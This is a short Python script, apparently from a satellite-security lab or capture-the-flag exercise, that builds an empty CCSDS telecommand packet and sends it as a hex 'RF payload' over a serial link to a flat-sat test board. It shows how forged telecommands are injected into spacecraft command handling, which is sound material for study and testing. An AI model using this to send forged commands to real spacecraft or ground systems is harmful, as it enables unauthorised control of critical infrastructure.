from pwn import *
import binascii
from spacepackets.ccsds.spacepacket import SpHeader
import serial
import time

PORT = '/dev/cu.usbmodemfsat1'
BAUD = 115200

tc_header = SpHeader.tc(apid=6, seq_count=5, data_len=0)
telecommand = tc_header.pack()

hex_payload = binascii.hexlify(telecommand).upper()
payload_str = hex_payload.decode()

success(f"[+] Final RF Payload (ASCII Hex): {payload_str}")

info(f"[*] Sending {len(payload_str)} characters over {PORT}...")

try:
    with serial.Serial(PORT, BAUD, timeout=1) as ser:
        time.sleep(2)

        ser.write(payload_str.encode('ascii') + b'\n')
        ser.flush()

        time.sleep(0.5)
        success("[+] Payload delivered successfully!")

except Exception as e:
    print(f"[!] Error opening serial port: {e}")